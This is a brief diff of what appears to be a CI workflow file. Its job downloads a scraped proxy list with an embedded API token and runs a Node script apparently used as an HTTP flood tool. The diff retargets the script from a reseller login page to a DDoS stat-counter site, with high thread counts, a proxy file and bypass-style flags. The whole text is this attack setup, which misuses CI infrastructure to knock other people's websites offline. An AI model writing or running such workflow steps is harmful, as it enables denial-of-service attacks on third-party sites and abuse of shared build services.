@@ -39,7 +39,7 @@ jobs:
           
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=bo68Q074v9z71CF9M05c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
-          node a.js GET https://gyrange.in/reseller/login 750 4 10 woo.txt --bfm --debug 
+          node a.js GET https://ip-count.dstat.uk/ 750 4 90 woo.txt --full --debug 
           
 
           
